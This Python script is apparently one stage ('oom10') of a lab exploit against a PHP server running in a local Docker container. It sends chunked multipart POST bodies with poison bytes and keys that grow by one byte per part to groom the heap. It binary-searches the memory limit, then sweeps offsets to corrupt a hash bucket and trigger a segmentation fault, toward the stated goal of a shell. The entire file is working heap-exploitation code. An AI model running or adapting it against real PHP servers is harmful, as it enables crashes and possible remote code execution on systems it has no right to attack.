#!/usr/bin/env python3
"""php2shell lab, oom10: variable-length keys + fine G sweep.

oom9 finding: constant poison keynames collide (NUL truncation at byte 300)
-> all inserts update ONE bucket; freed params recycle -> net growth ~0.
Fix: grow key length by 1 byte every part (300, 301, 302...) -> every param
freed block has a unique size class -> no reuse -> net ~1.9KB per part
(528B value + 1016B param churn + 328B key retained). 523 usable vars
= ~1MB growth >> any window.

Then sweep G in 256B steps: each key part allocates value(528) -> param(1016)
-> key(328). Crossing inside the key slice = malformed bucket (poison bytes).
Sweep covers several iterations' span (~4KB); expected hit rate ~1/6.
"""

import re
import socket
import subprocess
import sys
import time

HOST = "127.0.0.1"
BOUNDARY = "b" + "X" * 20
POISON = b"\x08"
UNIT = 128 * 1024
KEYVAL = 512
KEYRUN = 3000
BIGFREE = 256 * 1024


def part(name: bytes, value: bytes) -> bytes:
    head = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="'
    ).encode() + name + b'"\r\n\r\n'
    return head + value + b"\r\n"


def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True, timeout=60)
    time.sleep(1.5)


def send(port: int, parts: list[bytes], path: str = "index.php") -> tuple[bool, str]:
    body = b"".join(parts) + b"--" + BOUNDARY.encode() + b"--\r\n"
    s = socket.create_connection((HOST, port), timeout=300)
    s.sendall(
        (
            f"POST /{path} HTTP/1.1\r\nHost: {HOST}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
            f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
        ).encode()
    )
    for i in range(0, len(body), 65536):
        c = body[i:i + 65536]
        s.sendall(f"{len(c):x}\r\n".encode() + c + b"\r\n")
    s.sendall(b"0\r\n\r\n")
    resp = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        resp += d
    s.close()
    t = resp.decode("utf-8", "replace")
    return ("Fatal error" in t), t


def fatal_n(text: str):
    m = re.search(r"tried to allocate (\d+) bytes", text)
    return int(m.group(1)) if m else None


def build(fill_units: int, rem: int, keyrun: int = 0) -> list[bytes]:
    big = POISON * BIGFREE
    ps = [part(b"b0", big), part(b"b0", big)]
    fill = POISON * UNIT
    for i in range(fill_units):
        ps.append(part(b"u%d" % i, fill))
    if rem > 0:
        ps.append(part(b"r", POISON * rem))
    kv = POISON * KEYVAL
    for k in range(keyrun):
        ps.append(part(POISON * (300 + k), kv))   # unique length each part
    return ps


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
    log = lambda *a: print(*a, flush=True)

    a, b = 300, 520
    u_ok = None
    while a <= b:
        mid = (a + b) // 2
        restart()
        fatal, _ = send(port, build(mid, 0))
        log(f"cal units={mid}: fatal={fatal}")
        if fatal:
            b = mid - 1
        else:
            u_ok = mid
            a = mid + 1
    a, b = 0, UNIT
    r_ok = 0
    while a <= b:
        mid = (a + b) // 2
        restart()
        fatal, _ = send(port, build(u_ok, mid))
        log(f"cal rem={mid}: fatal={fatal}")
        if fatal:
            b = mid - 1
        else:
            r_ok = mid
            a = mid + 1
    log(f"edge: {u_ok} units + rem {r_ok}")

    # coarse: drop one unit at a time until key run fatals
    hit = None
    for drop in range(0, 4):
        units = u_ok - drop
        rem = r_ok if drop == 0 else UNIT - 1024
        restart()
        fatal, text = send(port, build(units, rem, keyrun=KEYRUN))
        n = fatal_n(text) if fatal else None
        log(f"coarse drop={drop}: fatal={fatal} alloc={n}")
        if fatal:
            hit = (units, rem)
            break
    if not hit:
        log("still no crossing; grow KEYRUN budget")
        return
    units, rem = hit

    # fine: 256B steps DOWN from rem (headroom grows 0..8KB)
    for d in range(0, 8193, 256):
        r = rem - d
        if r < 0:
            break
        restart()
        fatal, text = send(port, build(units, r, keyrun=KEYRUN))
        n = fatal_n(text) if fatal else None
        tag = "  *** KEY/HASH CROSSING ***" if (fatal and n and n < 428) else ""
        log(f"fine d={d}: fatal={fatal} alloc={n}{tag}")
        if tag:
            log(text[:300])
            break
    log("done — check error.log for 'exit signal Segmentation'")


if __name__ == "__main__":
    main()
